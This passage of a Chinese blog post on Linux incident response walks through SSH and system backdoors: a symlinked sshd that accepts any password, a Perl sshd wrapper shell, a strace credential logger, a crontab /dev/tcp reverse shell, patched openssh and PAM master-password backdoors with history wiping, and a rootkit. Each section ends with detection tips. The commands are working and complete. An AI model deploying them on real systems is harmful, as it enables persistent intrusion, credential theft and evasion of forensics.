+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-3.png"></p>
+<p>其中 <code>id_rsa</code>为私钥，<code>id_rsa.pub</code>为公钥，接下来打开<code>id_rsa.pub</code>，将内容复制到服务器。将<code>id_rsa.pub</code>的内容追加到<code>/root/.ssh/authorized_keys</code>内，配置完成。</p>
+<p>排查技巧：查看<code>/root/.ssh/authorized_keys</code>是否被修改。</p>
+<h4 id="4、软连接"><a href="#4、软连接" class="headerlink" title="4、软连接"></a><strong>4、软连接</strong></h4><p>在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 <code>/tmp/su</code> 在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如: &#x2F;etc&#x2F;pam.d&#x2F;su)，任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。</p>
+<p>在目标服务器上执行一句话后门：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888</span><br></pre></td></tr></table></figure>
+
+<p>执行完之后，任何一台机器<code>ssh root@IP -p 8888</code>，输入任意密码，成功登录。</p>
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-4.png"></p>
+<p>排查技巧：进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。</p>
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-4-1.png"></p>
+<h4 id="5、SSH-wrapper"><a href="#5、SSH-wrapper" class="headerlink" title="5、SSH wrapper"></a><strong>5、SSH wrapper</strong></h4><p>首先启动的是&#x2F;usr&#x2F;sbin&#x2F;sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动&#x2F;usr&#x2F;bin&#x2F;sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的&#x2F;usr&#x2F;sbin&#x2F;sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell</p>
+<p>简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p>
+<p>服务端：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin/</span><br><span class="line">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class="line">echo &#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27; &gt;&gt;sshd</span><br><span class="line">echo &#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">/etc/init.d/sshd restart</span><br></pre></td></tr></table></figure>
+
+<p>客户端：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">socat STDIO TCP4:target_ip:22,sourceport=13377</span><br><span class="line"></span><br><span class="line">#如果你想修改源端口，可以用python的struct标准库实现。其中x00x00LF是19526的大端形式，便于传输和处理。</span><br><span class="line">&gt;&gt;&gt; import struct</span><br><span class="line">&gt;&gt;&gt; buffer = struct.pack(&#x27;&gt;I6&#x27;,19526)</span><br><span class="line">&gt;&gt;&gt; print repr(buffer)</span><br><span class="line">&#x27;\x00\x00LF&#x27;</span><br><span class="line">&gt;&gt;&gt; buffer = struct.pack(&#x27;&gt;I6&#x27;,13377)</span><br><span class="line">&gt;&gt;&gt; print buffer</span><br><span class="line">4A</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-5.png"></p>
+<p>排查技巧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ls -al /usr/sbin/sshd</span><br><span class="line"># cat /usr/sbin/sshd</span><br><span class="line">可通过重装ssh服务恢复。</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="6、strace后门"><a href="#6、strace后门" class="headerlink" title="6、strace后门"></a><strong>6、strace后门</strong></h4><p>通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#vim /etc/bashrc</span><br><span class="line">alias ssh=&#x27;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#x27;</span><br><span class="line"># source /root/.bashrc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-5-1.png"></p>
+<p>排查技巧：使用<code>alias</code>即可发现异常。</p>
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-5-2.png"></p>
+<h4 id="7、crontab反弹shell"><a href="#7、crontab反弹shell" class="headerlink" title="7、crontab反弹shell"></a><strong>7、crontab反弹shell</strong></h4><p>crontab命令用于设置周期性被执行的指令。新建shell脚本，利用脚本进行反弹。</p>
+<p>a、创建shell脚本，例如在&#x2F;etc&#x2F;evil.sh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><code>chmod +sx /etc/evil.sh</code></p>
+<p>b、crontab -e 设置定时任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#每一分钟执行一次</span><br><span class="line">*/1 * * * * root /etc/evil.sh</span><br></pre></td></tr></table></figure>
+
+<p>重启crond服务，<code>service crond restart</code>，然后就可以用nc接收shell。</p>
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-6.png"></p>
+<p>排查技巧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看可疑的定时任务列表</span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="8、openssh后门"><a href="#8、openssh后门" class="headerlink" title="8、openssh后门"></a><strong>8、openssh后门</strong></h4><p>利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">a、备份SSH配置文件</span><br><span class="line">mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old</span><br><span class="line">mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old</span><br><span class="line"></span><br><span class="line">b、解压并安装补丁</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">cp openssh-5.9p1.patch/sshbd5.9p1.diff  /openssh-5.9p1</span><br><span class="line">cd openssh-5.9p1</span><br><span class="line">patch &lt; sshbd5.9p1.diff</span><br><span class="line"></span><br><span class="line">c、记录用户名和密码的文件位置及其密码</span><br><span class="line">vi  includes.h</span><br><span class="line">	#define ILOG &quot;/tmp/1.txt&quot;             //记录登录本机的用户名和密码</span><br><span class="line">	#define OLOG &quot;/tmp/2.txt&quot;             //记录本机登录远程的用户名和密码</span><br><span class="line">	#define SECRETPW &quot;123456789&quot;          //后门的密码</span><br><span class="line"></span><br><span class="line">d、修改版本信息</span><br><span class="line">vi version.h</span><br><span class="line">	#define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot;</span><br><span class="line">	#define SSH_PORTABLE &quot;小版本号&quot;</span><br><span class="line">	</span><br><span class="line">e、安装并编译</span><br><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5</span><br><span class="line">make clean</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">service sshd restart</span><br><span class="line"></span><br><span class="line">f、对比原来的配置文件，使配置文件一致，然后修改文件日期。</span><br><span class="line"></span><br><span class="line">touch -r  /etc/ssh/ssh_config.old /etc/ssh/ssh_config</span><br><span class="line">touch -r  /etc/ssh/sshd_config.old /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">g、清除操作记录</span><br><span class="line">export HISTFILE=/dev/null</span><br><span class="line">export HISTSIZE=0</span><br><span class="line">echo &gt;/root/.bash_history //清空操作日志</span><br></pre></td></tr></table></figure>
+
+<p>排查技巧：利用strace找出ssh后门.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 1、获取可疑进程PI</span><br><span class="line">ps aux | grep sshd</span><br><span class="line"># 2、跟踪sshd PID</span><br><span class="line">strace -o aa -ff -p  PID</span><br><span class="line"># 3、查看记录密码打开文件</span><br><span class="line">grep open sshd* | grep -v -e No -e  null -e denied| grep  WR</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="9、PAM后门"><a href="#9、PAM后门" class="headerlink" title="9、PAM后门"></a><strong>9、PAM后门</strong></h4><p>PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX 9.0等。</p>
+<p>利用方法:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、获取目标系统所使用的PAM版本，下载对应版本的pam版本</span><br><span class="line">2、解压缩，修改pam_unix_auth.c文件，添加万能密码</span><br><span class="line">3、编译安装PAM</span><br><span class="line">4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。</span><br></pre></td></tr></table></figure>
+
+<p>排查技巧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 1、通过Strace跟踪ssh</span><br><span class="line">ps axu | grep sshd</span><br><span class="line">strace -o aa -ff -p PID</span><br><span class="line">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class="line"># 2、检查pam_unix.so的修改时间</span><br><span class="line">stat /lib/security/pam_unix.so      #32位</span><br><span class="line">stat /lib64/security/pam_unix.so    #64位</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="10、rookit后门"><a href="#10、rookit后门" class="headerlink" title="10、rookit后门"></a><strong>10、rookit后门</strong></h4><p>Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。</p>
+<p>利用方法：安装完成后，使用ssh 用户@IP -P 配置的端口，即可远程登录。</p>
+<p>连接后的截图：</p>
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-7.png"></p>
+<p>排查技巧：查看端口是否异常，RPM check查看命令是否被替换。</p>
+</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">JGwebre</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://heisha123.github.io/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/">https://heisha123.github.io/2025/08/03/应急响应-Linux篇/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本站点所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://heisha123.github.io">JG的个人博客</a>！</span></div></div><div class="post-copyright valine" id="comments-container"><script src="//unpkg.com/valine@1.4.14/dist/Valine.min.js"></script><script>let arr = location.href.split('/#more')[0].split('/');
+let title = arr[arr.length - 1];
+if (title === '') {
+    title = arr[arr.length - 2];
+}
+var flag = false;
+var gitFun = function () {
+    try {
+        var valineObj = window.GLOBAL_CONFIG.valine;
+        new Valine({
+            el: "#comments-container",
+            ...valineObj
+        });
+        flag = true;
+    } catch (e) {
+        flag = false;
+    }
+}
+var setIn = setInterval(() => {
+    if (!flag) {
+        gitFun();
+    } else {
+        clearInterval(setIn);
+    }
+}, 200);</script></div></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2025/08/03/%E4%B8%A4%E4%B8%AA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/"><i class="fas fa-angle-left">&nbsp;</i><span>两个应急响应脚本分析</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/"><span>应急响应 windows篇</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2025 By JGwebre</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>
